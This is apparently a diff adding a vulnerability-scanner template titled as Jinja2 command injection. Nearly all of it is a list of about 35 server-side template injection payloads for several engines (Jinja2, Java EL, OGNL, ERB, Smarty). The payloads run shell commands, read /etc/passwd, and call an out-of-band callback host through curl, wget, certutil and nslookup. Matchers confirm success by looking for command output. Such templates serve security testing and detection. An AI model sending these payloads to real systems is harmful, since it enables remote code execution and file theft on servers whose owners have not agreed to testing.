@@ -1,0 +1,79 @@
+id: ssti
+
+info:
+  name: Jinja2 2.10 - Command injection from_string function
+  author: pikpikcu
+  severity: critical
+  reference: 
+    - https://medium.com/@meet.19beitg131/template-injection-htb-b54c9380784e
+    - https://blog.pentesteracademy.com/webapp-security-ctf-dec-11-15-pwning-under-5-mins-df26d61fc36c
+  tags: rce,ssti
+  
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/{{url_encode((${T(java.lang.Runtime).getRuntime().exec('id')}))}}"
+      - '{{BaseURL}}{{url_encode(;a=a/__${T (java.lang.Runtime).getRuntime().exec("certutil -urlcache -split -f http://{{interactsh-url}}")}__::.x/)}}'
+      - '{{BaseURL}}/{{url_encode(__${T (java.lang.Runtime).getRuntime().exec("certutil -urlcache -split -f http://{{interactsh-url}}")}__::.x/)}}'
+      - "{{BaseURL}}/{{url_encode(#{%x['id']})}}"
+      - '{{BaseURL}}/{{url_encode(${this.evaluate("1054*2856"))}}'
+      - "{{BaseURL}}/{{url_encode(<%=%20system('wget {{interactsh-url}}') %>)}}"
+      - "{{BaseURL}}/{{url_encode({{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}})}}"
+      - "{{BaseURL}}/{{url_encode(<%= `curl {{interactsh-url}}` %>')}}"
+      - "{{BaseURL}}/{{url_encode({php}echo `wget {{interactsh-url}}`;{/php})}}"
+      - "{{BaseURL}}/{{url_encode({{ lipsum.__globals__['os'].popen('id').read() }})}}"
+      - "{{BaseURL}}/{{url_encode(['nslookup {{interactsh-url}}'])}}"
+      - "{{BaseURL}}/{{url_encode(['curl {{interactsh-url}}'])}}"
+      - '{{BaseURL}}/{{url_encode(__${T(java.lang.Runtime).getRuntime().exec("id")}__::.x)}}'
+      - "{{BaseURL}}/{{url_encode(}}{%+import+os+%}{{os.system('nslookup {{interactsh-url}}')}})}}"
+      - "{{BaseURL}}/{{url_encode(${T(java.lang.Runtime).getRuntime().exec('nslookup {{interactsh-url}}')})}}"
+      - "{{BaseURL}}/{{url_encode({T(java.lang.Runtime).getRuntime().exec('nslookup {{interactsh-url}}')})}}"
+      - "{{BaseURL}}/{{url_encode(T(java.lang.Runtime).getRuntime().exec('id').x)}}"
+      - "{{BaseURL}}/{{url_encode(<%= IO.popen('id').readlines() %>)}}"
+      - "{{BaseURL}}/{{url_encode(<%= `id` %>)}}"
+      - "{{BaseURL}}/{{url_encode(abc${12*12}abc)}}"
+      - "{{BaseURL}}/{{url_encode(abc{% 12*12 %}abc)}}"
+      - '{{BaseURL}}/{{url_encode(<!--#exec cmd="id" -->)}}'
+      - "{{BaseURL}}/{{url_encode({{ cycler.__init__.__globals__.os.popen('id').read() }})}}"
+      - "{{BaseURL}}/{{url_encode({{ joiner.__init__.__globals__.os.popen('id').read() }})}}"
+      - "{{BaseURL}}/{{url_encode({{ namespace.__init__.__globals__.os.popen('id').read() }})}}"
+      - "{{BaseURL}}/{{url_encode({{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }})}}"
+      - "{{BaseURL}}/{{url_encode(${''.getClass().forName('java.lang.Runtime').getMethods()[6].invoke(''.getClass().forName('java.lang.Runtime')).exec('id')})}}"
+      - "{{BaseURL}}/{{url_encode({{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}})}}"
+      - "{{BaseURL}}/{{url_encode({{url_for.__globals__.__builtins__.open('/etc/passwd').read()}})}}"
+      - "{{BaseURL}}/{{url_encode({{config.__class__.__init__.__globals__['os'].popen('ls').read()}})}}"
+      - "{{BaseURL}}/{{url_encode(${#a=(new java.lang.ProcessBuilder(new java.lang.String[]{'id'})).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#matt=#context.get(‘com.opensymphony.xwork2.dispatcher.HttpServletResponse’),#matt.getWriter().println(#e),#matt.getWriter().flush(),#matt.getWriter().close()})}}"
+      - "{{BaseURL}}/{{url_encode({{url_for.__globals__.os.__dict__.popen('id').read()}})}}"
+      - "{{BaseURL}}/{{url_encode({{url_for.__globals__.os.__dict__.system('id').read()}})}}"
+      - "{{BaseURL}}/{{url_encode({{url_for.__globals__.__builtins__.open('/etc/passwd').read()}})}}"
+      - '{{BaseURL}}/{{url_encode(${("".getClass()).forName("java.lang".concat("Runtime")).getMethods()[6].invoke(("".getClass()).forName("java.lang".concat("Runtime"))).exec("wget {{interactsh-url}}")})}}'
+      
+    stop-at-first-match: true
+    matchers-condition: or
+    matchers:
+      - type: regex
+        regex:
+          - "3010224"
+          - "root:x:0:0"
+          - "abc144abc"
+        part: body
+        condition: or
+        
+      - type: word
+        part: interactsh_protocol 
+        words:
+          - "http"
+          - "dns"
+        condition: or
+        
+      - type: word
+        part: body
+        words:
+          - "uid="
+          - "gid="
+        condition: and
+        
+    extractors:
+      - type: regex
+        regex:
+          - "(u|g)id=.*"
